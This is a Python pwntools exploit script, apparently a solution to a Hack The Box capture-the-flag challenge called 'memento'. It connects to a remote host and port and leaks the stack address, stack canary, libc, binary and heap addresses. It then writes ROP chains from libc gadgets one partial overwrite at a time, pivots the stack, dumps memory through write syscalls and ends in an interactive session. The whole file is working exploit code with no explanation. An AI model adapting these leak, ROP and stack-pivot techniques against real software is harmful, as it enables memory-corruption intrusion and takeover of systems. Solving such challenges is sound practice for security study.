#!/usr/bin/python3

from pwn import *
import os

exe = ELF("memento", checksec=False)
# libc = ELF("./libc.so.6", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "DEBUG"
context.endian == 'little'
isDebug = False

# brva 0x00000000000014D4 before calling loop() in main function

gs = '''
break loop
break remember
break reset
break recall
brva 0x0000000000001248
disable
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)

def printMsg(msg):
	if isDebug:
		print(msg)

def remember(input1:bytes, input2:bytes):
	io.send(b"A")
	io.send(input1)
	io.send(input2)
	
def recall():
	io.send(b"B")
	result = io.recv()
	return result

def reset():
	io.send(b"C")

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## REMOTE ########
connections = "94.237.63.207:44777"
io = remote(connections.split(":")[0], int(connections.split(":")[1]))
io.timeout = 8

# First leak libc, stack and binary
remember(p8(0xff), p8(0xff)*0xff)
leak = recall()

# leak stackBuffer address
stack_buffer = u64(leak[32:40]) - 0x19

if stack_buffer & 0xff < 0x48 or stack_buffer & 0xff > 0xd0:
	print("stackBuffer is placed to close to 0x48. Bailing out.")
	print(f"{hex(stack_buffer)=}")
	exit()

# leak canary
canary = leak[40:48]

# leak libc base
ret_address_and_libc = leak[56:64]
libc_base = u64(ret_address_and_libc) - 0x2a1ca

libc_dir = "./libcs2"
libcs = []
for file_name in os.listdir(libc_dir):
	# Create the full path to the file
	full_path = os.path.join(libc_dir, file_name)
	
	# Check if it's a regular file (not a directory)
	if os.path.isfile(full_path) and full_path.endswith(".so"):
		# Load the file as an ELF object and append to the array
		lib = ELF(full_path, checksec=False)
		lib.address = libc_base
		libcs.append(lib)

libc = libcs[0] # The first one in the list is the right one. Ubuntu GLIBC 2.39-0ubuntu8.2
rop_libc = ROP(libc)

# leak binary
binary_leak = u64(leak[88:96]) 
binary_base = binary_leak - 0x13b0 
_io_2_1_stdin_ = libc.symbols._IO_2_1_stdin_
_io_2_1_stdout_ = libc.symbols._IO_2_1_stdout_
_io_2_1_stderr_ = libc.symbols._IO_2_1_stderr_
exe.address = binary_base

print(f"{hex(stack_buffer)=}")
print(f"{hex(u64(canary))=}")
print(f"{hex(u64(ret_address_and_libc))=}")
print(f"{hex(_io_2_1_stdin_)=}")
print(f"{hex(_io_2_1_stdout_)=}")
print(f"{hex(_io_2_1_stderr_)=}")
print(f"{hex(libc_base)=}")
print(f"{hex(binary_leak)=}")
print(f"{hex(binary_base)=}")

# exploit...
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
ret_address = pop_rdi + 1
system = libc.symbols.system
execve = libc.symbols.execve
dup2 = libc.symbols.dup2
exit_syscall = libc.sym['exit']
bin_sh = next(libc.search(b'/bin/sh\0'))
pop_rsp = rop_libc.find_gadget(['pop rsp', 'ret'])[0]
pop_rsi = rop_libc.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop_libc.find_gadget(['pop rdx', 'leave', 'ret'])[0]
pop_r13 = rop_libc.find_gadget(['pop r13', 'ret'])[0]
mov_rdx_r13_syscall = libc_base + 0x000000000009d13c
pop_rax = rop_libc.find_gadget(['pop rax', 'ret'])[0]
pop_rbx = rop_libc.find_gadget(['pop rbx', 'ret'])[0]
xor_rax = libc.address + 0x00000000000c75e9
syscall_ret = rop_libc.find_gadget(['syscall', 'ret'])[0]
mov_rdx_rbx_chain = libc.address + 0x00000000000b0123 # mov rdx, rbx; pop rbx; pop r12; pop rbp; ret; 
add_rdi = libc.address + 0x00000000000f987 # add rdi, 1; test al, al; jne 0xf9821; xor eax, eax; ret; 
mov_rdx_minus_one = libc.address + 0x0000000000138ce7 # mov rdx, -1; ret; 
xor_edx_edx = libc.address + 0x000000000016e953 # xor edx, edx; mov rax, rdx; ret; 
shl_edx = libc.address + 0x000000000004775a # shl edx, 0x20; or rax, rdx; ret; 
add_rax_one = libc.address + 0x00000000000dd4d0 # add rax, 1; ret;
pop_rdx = libc.address + 0x0000000000137562 # pop rdx; xor edi, eax; dec dword ptr [rax - 0x73]; adc eax, 0xfff832f3; cmove rax, rdx; ret; 
mov_rax_r10 = libc.address + 0x00000000001458b6 # mov rax, r10; ret; 
binary_ret = binary_base + 0x000000000000101a

rop_write_start_lsb = ((stack_buffer + 0x28) & 0xff) - 0x1
jump_overwrite_lsb = ((stack_buffer - 0x48) & 0xff) - 0x1
start_of_rop_address = stack_buffer + 0x28

over_write_start_print = stack_buffer + 0x28
jump_overwrite_print = stack_buffer - 0x48
start_of_rop_print = stack_buffer + 0x28

print(f"{hex(over_write_start_print)=}")
print(f"{hex(jump_overwrite_print)=}")
print(f"{hex(start_of_rop_print)=}")

if rop_write_start_lsb + 0x40 >= 0x100:
	print("rop_write_start_lsb is placed to close to 0x100. Bailing out.")
	print(f"{hex(rop_write_start_lsb)=}")
	print(f"{hex(rop_write_start_lsb + 0x40)=}")
	exit()

# write syscall: write(stdout, what_to_read, how_much)
# rax = 1 (write)
# rdi = stdout (1)
# rsi = what to read
# rdx = how much to read
# syscall

reset()
remember(p8(0x80), p8(0x33)*0x18 + p64(0x8) + p8(rop_write_start_lsb+0x0) + p64(pop_rdx) + p8(0x33) * 87)
reset()
remember(p8(0x80), p8(0x33)*0x18 + p64(0x8) + p8(rop_write_start_lsb+0x8) + p64(0x250) + p8(0x33) * 87)
reset()
remember(p8(0x80), p8(0x22)*0x18 + p64(0x8) + p8(rop_write_start_lsb+0x10) + p64(mov_rax_r10) + p8(0x22) * 87)
reset()
remember(p8(0x80), p8(0x33)*0x18 + p64(0x8) + p8(rop_write_start_lsb+0x18) + p64(pop_rsi) + p8(0x33) * 87)
reset()
remember(p8(0x80), p8(0x22)*0x18 + p64(0x8) + p8(rop_write_start_lsb+0x20) + p64(_io_2_1_stdin_) + p8(0x22) * 87)
reset()
remember(p8(0x80), p8(0x33)*0x18 + p64(0x8) + p8(rop_write_start_lsb+0x28) + p64(pop_rdi) + p8(0x33) * 87)
reset()
remember(p8(0x80), p8(0x22)*0x18 + p64(0x8) + p8(rop_write_start_lsb+0x30) + p64(0x1) + p8(0x22) * 87)
reset()
remember(p8(0x80), p8(0x33)*0x18 + p64(0x8) + p8(rop_write_start_lsb+0x38) + p64(syscall_ret) + p8(0x33) * 87)
reset()
remember(p8(0x80), p8(0x22)*0x18 + p64(0x8) + p8(rop_write_start_lsb+0x40) + p64(exe.address + 0x00000000000013B0) + p8(0x22) * 87)
reset()
# pause()
remember(p8(0x80), p8(0xdc)*0x18 + p64(0x0) + p8(jump_overwrite_lsb) + p64(pop_rsp) + p64(start_of_rop_address) + p8(0xdc) * 79)

# # Leak heap
second_leak = io.recv()

# second_leak = recall()
heap_leak = second_leak[576:584]
heap_leak_int = u64(heap_leak)
heap_leak_int_shifted = heap_leak_int
heap_base = heap_leak_int_shifted - 0x22e0

print(f"{hex(heap_leak_int_shifted)=}")
print(f"{hex(heap_base)=}")

read_this_heap = heap_base + 0x2a0
print(f"{hex(read_this_heap)=}")

new_stack_buffer = stack_buffer + 0x38
new_rop_write_start_lsb = ((new_stack_buffer + 0x28) & 0xff) - 0x1
new_jump_overwrite_lsb = ((new_stack_buffer - 0x48) & 0xff) - 0x1
new_start_of_rop_address = new_stack_buffer + 0x28

if new_rop_write_start_lsb + 0x40 >= 0x100:
	print("New rop_write_start_lsb is placed to close to 0x100. Bailing out.")
	print(f"{hex(new_rop_write_start_lsb)=}")
	print(f"{hex(new_rop_write_start_lsb + 0x40)=}")
	exit()

io.send(b"HTB{}")

reset()
remember(p8(0x80), p8(0x33)*0x18 + p64(0x8) + p8(new_rop_write_start_lsb+0x0) + p64(pop_rdx) + p8(0x33) * 87)
reset()
remember(p8(0x80), p8(0x33)*0x18 + p64(0x8) + p8(new_rop_write_start_lsb+0x8) + p64(0x250) + p8(0x33) * 87)
reset()
remember(p8(0x80), p8(0x22)*0x18 + p64(0x8) + p8(new_rop_write_start_lsb+0x10) + p64(mov_rax_r10) + p8(0x22) * 87)
reset()
remember(p8(0x80), p8(0x33)*0x18 + p64(0x8) + p8(new_rop_write_start_lsb+0x18) + p64(pop_rsi) + p8(0x33) * 87)
reset()
remember(p8(0x80), p8(0x22)*0x18 + p64(0x8) + p8(new_rop_write_start_lsb+0x20) + p64(read_this_heap) + p8(0x22) * 87)
reset()
remember(p8(0x80), p8(0x33)*0x18 + p64(0x8) + p8(new_rop_write_start_lsb+0x28) + p64(pop_rdi) + p8(0x33) * 87)
reset()
remember(p8(0x80), p8(0x22)*0x18 + p64(0x8) + p8(new_rop_write_start_lsb+0x30) + p64(0x1) + p8(0x22) * 87)
reset()
remember(p8(0x80), p8(0x33)*0x18 + p64(0x8) + p8(new_rop_write_start_lsb+0x38) + p64(syscall_ret) + p8(0x33) * 87)
reset()
remember(p8(0x80), p8(0x22)*0x18 + p64(0x8) + p8(new_rop_write_start_lsb+0x40) + p64(exe.address + 0x00000000000013B0) + p8(0x22) * 87)
reset()
remember(p8(0x80), p8(0xdc)*0x18 + p64(0x0) + p8(new_jump_overwrite_lsb) + p64(pop_rsp) + p64(new_start_of_rop_address) + p8(0xdc) * 79)

io.interactive()